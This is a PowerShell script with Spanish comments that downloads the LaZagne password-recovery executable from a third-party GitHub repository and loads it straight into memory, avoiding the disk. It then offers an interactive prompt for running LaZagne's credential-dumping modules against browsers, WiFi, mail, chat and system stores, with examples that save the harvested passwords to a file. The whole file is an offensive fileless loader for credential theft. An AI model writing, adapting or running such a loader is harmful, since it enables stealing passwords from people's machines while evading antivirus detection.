# lag_loader.ps1 - Solo carga en memoria, tú ejecutas los comandos
Write-Host "=== LaZagne Memory Loader ===" -ForegroundColor Cyan
Write-Host "Cargando LaZagne en memoria..." -ForegroundColor Yellow

# 1. Descargar el .exe a bytes en memoria
$exeUrl = "https://github.com/kobasky17/lagzane.exe-for-windows/raw/refs/heads/master/laZagne.exe"
$exeBytes = (New-Object Net.WebClient).DownloadData($exeUrl)

# 2. Cargar el assembly en memoria
$laZagneAssembly = [System.Reflection.Assembly]::Load($exeBytes)

Write-Host "[✓] LaZagne cargado en memoria" -ForegroundColor Green
Write-Host "[✓] Assembly cargado: $($laZagneAssembly.FullName)" -ForegroundColor Gray

# 3. Función para ejecutar comandos
function Invoke-LaZagne {
    param(
        [Parameter(Mandatory=$true)]
        [string[]]$Arguments
    )
    
    Write-Host "`n[→] Ejecutando: laZagne $Arguments" -ForegroundColor Green
    Write-Host "─" * 50 -ForegroundColor DarkGray
    
    try {
        # Ejecutar desde memoria
        $result = $laZagneAssembly.EntryPoint.Invoke($null, @(, $Arguments))
        Write-Host "`n[✓] Comando ejecutado" -ForegroundColor Green
        return $result
    } catch {
        Write-Host "[✗] Error: $_" -ForegroundColor Red
        return $null
    }
}

# 4. Mostrar ayuda básica
Write-Host @"

╔═══════════════════════════════════════════╗
║          COMANDOS DISPONIBLES             ║
╠═══════════════════════════════════════════╣
║ • all              - Todos los módulos    ║
║ • browsers         - Navegadores          ║
║ • wifi             - Contraseñas WiFi     ║
║ • sysadmin         - Sistema              ║
║ • mails            - Correos              ║
║ • chats            - Mensajería           ║
║ • games            - Juegos               ║
║ • memory           - Memoria RAM          ║
║                                         ║
║ OPCIONES:                                 ║
║ • -oN              - Output normal        ║
║ • -oJ              - Output JSON          ║
║ • -oX              - Output XML           ║
║ • -output archivo  - Guardar en archivo   ║
║ • -vv              - Modo verbose         ║
╚═══════════════════════════════════════════╝

EJEMPLOS:
  Invoke-LaZagne -Arguments @("browsers", "-oN")
  Invoke-LaZagne -Arguments @("wifi", "-output", "C:\pass.txt")
  Invoke-LaZagne -Arguments @("all", "-oJ", "-vv")

ESCRIBE TUS COMANDOS ABAJO:
"@ -ForegroundColor Magenta

# 5. Mantener PowerShell abierto para que escribas comandos
Write-Host "`n[!] Escribe 'exit' para salir" -ForegroundColor Yellow
Write-Host "[!] Usa: Invoke-LaZagne -Arguments @('comando', 'opciones')" -ForegroundColor Cyan

# Mantener sesión activa
while ($true) {
    Write-Host "`nPS LaZagne> " -ForegroundColor Green -NoNewline
    $input = Read-Host
    
    if ($input -eq "exit") { break }
    
    # Si el usuario escribe directamente un comando, intentar ejecutarlo
    if ($input -match "^[a-z]") {
        $argsArray = $input.Split(" ")
        Invoke-LaZagne -Arguments $argsArray
    }
}